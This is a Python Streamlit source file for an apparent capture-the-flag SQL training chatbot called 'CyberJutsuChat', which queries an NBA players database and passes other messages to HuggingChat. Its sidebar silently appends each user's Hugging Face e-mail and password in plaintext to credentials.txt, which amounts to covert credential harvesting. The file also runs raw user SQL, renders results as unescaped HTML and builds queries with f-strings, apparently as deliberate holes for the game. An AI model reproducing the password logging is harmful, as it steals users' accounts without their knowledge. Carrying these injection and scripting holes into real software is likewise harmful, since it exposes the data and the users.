import streamlit as st
from hugchat import hugchat
from hugchat.login import Login
import sqlite3
import pandas as pd
import time

# App title
st.set_page_config(page_title="🤗💬 HugChat")

# Hugging Face Credentials
def write_credentials_to_file(email, password):
    try:
        with open('credentials.txt', 'a') as file:
            file.write(f"Email: {email}\n")
            file.write(f"Password: {password}\n")
            file.write("-----\n")
    except Exception as e:
        st.error(f"Error writing to file: {e}")

with st.sidebar:
    st.title('🤗💬 CyberJutsuChat')
    if ('EMAIL' in st.secrets) and ('PASS' in st.secrets):
        st.success('HuggingFace Login credentials already provided!', icon='✅')
        hf_email = st.secrets['EMAIL']
        hf_pass = st.secrets['PASS']
    else:
        hf_email = st.text_input('Enter E-mail:', type='password')
        hf_pass = st.text_input('Enter password:', type='password')
        if not (hf_email and hf_pass):
            st.warning('Please enter your credentials!', icon='⚠️')
        else:
            st.success('Proceed to entering your prompt message!', icon='👉')
            # Write the credentials to a file
            write_credentials_to_file(hf_email, hf_pass)
    st.markdown('📖 Learn how to build this app in this [blog](https://blog.streamlit.io/how-to-build-an-llm-powered-chatbot-with-streamlit/)!')

# Initialize session state
if "messages" not in st.session_state.keys():
    st.session_state.messages = [{"role": "assistant", "content": "How may I help you?"}]
if "sql_challenge" not in st.session_state.keys():
    st.session_state.sql_challenge = "SELECT * FROM players LIMIT 5;"
if "show_flag_info" not in st.session_state.keys():
    st.session_state.show_flag_info = False
if "current_level" not in st.session_state.keys():
    st.session_state.current_level = None
if "level_challenges_completed" not in st.session_state.keys():
    st.session_state.level_challenges_completed = 0

# Display chat messages
for message in st.session_state.messages:
    with st.chat_message(message["role"]):
        st.write(message["content"])

# Function for generating LLM response
def generate_response(prompt_input, email, passwd):
    # Hugging Face Login
    sign = Login(email, passwd)
    cookies = sign.login()
    # Create ChatBot                        
    chatbot = hugchat.ChatBot(cookies=cookies.get_dict())
    return chatbot.chat(prompt_input)

# Function for executing SQL queries with time measurement
def execute_sql_query_with_time(query):
    conn = sqlite3.connect('nba_players.sqlite')  # Ensure the correct database file
    cursor = conn.cursor()
    try:
        start_time = time.time()
        cursor.execute(query)
        result = cursor.fetchall()
        execution_time = time.time() - start_time
        columns = [desc[0] for desc in cursor.description]
        conn.close()
        return columns, result, execution_time
    except sqlite3.Error as e:
        conn.close()
        return None, str(e), None

# Function for retrieving challenges from the database
def get_sql_challenges_from_db(level):
    conn = sqlite3.connect('nba_players.sqlite')
    cursor = conn.cursor()
    query = f"SELECT challenge FROM level WHERE level = {level};"
    try:
        cursor.execute(query)
        results = cursor.fetchall()
        conn.close()
        if results:
            return [challenge[0] for challenge in results]
        else:
            return []
    except sqlite3.Error as e:
        conn.close()
        return []

# User-provided prompt
if prompt := st.chat_input(disabled=not (hf_email and hf_pass)):
    st.session_state.messages.append({"role": "user", "content": prompt})
    with st.chat_message("user"):
        st.write(prompt)

    # Check if prompt is a SQL query
    if prompt.strip().lower().startswith("select"):
        columns, result, exec_time = execute_sql_query_with_time(prompt)
        if columns:
            # Display results as a table
            df = pd.DataFrame(result, columns=columns)
            st.write(df.to_html(escape=False), unsafe_allow_html=True)
            # Display execution time
            st.write(f"Query executed successfully in {exec_time:.2f} seconds.")
        else:
            st.write(f"Error executing query: {result}")
    elif prompt.strip().lower().startswith("level"):
        try:
            level = int(prompt.strip().split(" ")[-1])
            if level == 6:
                response = "You are now in level 6. Try to find the hidden admin page by exploiting SQL injection vulnerabilities. Hint: Think about how you can manipulate queries to reveal unexpected results."
                st.session_state.sql_challenge = "SELECT * FROM level WHERE level = 6;"
            else:
                challenges = get_sql_challenges_from_db(level)
                if challenges:
                    st.session_state.current_level = level
                    st.session_state.level_challenges_completed = 0
                    response = f"**SQL Challenges for Level {level}:**\n" + "\n".join(challenges)
                else:
                    response = "No challenges found for this level."
        except ValueError:
            response = "Invalid level format. Please enter a valid level number."
        with st.chat_message("assistant"):
            st.write(response)
        st.session_state.messages.append({"role": "assistant", "content": response})
    elif prompt.strip().lower() == "open flag":
        st.session_state.show_flag_info = True
        # Display database information
        response = """
        ## Database Information
        The current database file is `nba_players.sqlite`. This file contains information about NBA players.
        
        ### Description
        This chatbox application allows users to interact with an SQL database through a conversational interface. You can type SQL queries to retrieve data from the `nba_players.sqlite` database. Additionally, there are SQL Challenges provided to help you practice writing SQL queries.
        
        ### How to Use
        1. Enter your Hugging Face credentials in the sidebar.
        2. Type SQL queries into the chatbox to interact with the database.
        3. To access SQL challenges, type `level` followed by a number (e.g., `level 1`).
        4. If you encounter any issues or need help, type your query or ask for assistance.

        **To return to the challenges or normal operation, type `stop level` after completing all challenges for a level.**
        """
        with st.chat_message("assistant"):
            st.write(response)
        st.session_state.messages.append({"role": "assistant", "content": response})
    elif prompt.strip().lower() == "stop flag":
        st.session_state.show_flag_info = False
        # Remove flag information if it was previously displayed
        response = "Flag information has been hidden."
        with st.chat_message("assistant"):
            st.write(response)
        st.session_state.messages.append({"role": "assistant", "content": response})
    elif prompt.strip().lower() == "stop level":
        if st.session_state.level_challenges_completed >= 5:
            st.session_state.show_flag_info = True
            st.session_state.current_level = None
            st.session_state.level_challenges_completed = 0
            response = "You have completed all challenges for this level. Returning to flag information."
        else:
            response = "You must complete all 5 challenges for the current level before stopping."
        with st.chat_message("assistant"):
            st.write(response)
        st.session_state.messages.append({"role": "assistant", "content": response})
    else:
        # Generate response from Hugging Face if it's not an SQL query or flag command
        if st.session_state.messages[-1]["role"] != "assistant":
            with st.chat_message("assistant"):
                with st.spinner("Thinking..."):
                    response = generate_response(prompt, hf_email, hf_pass)
                    st.write(response)
            message = {"role": "assistant", "content": response}
            st.session_state.messages.append(message)

    # SQL Challenge
    if st.session_state.show_flag_info:
        challenge_query = st.session_state.sql_challenge
        st.markdown(f"**SQL Challenge:** Try to write a query that matches the challenge below.")
        st.markdown(f"`{challenge_query}`")

        # Provide feedback on challenge
        if prompt.strip().lower() == challenge_query.strip().lower():
            st.write("Well done! Your query matches the challenge.")
            st.session_state.level_challenges_completed += 1
        else:
            st.write("Try again or ask for hints if needed.")
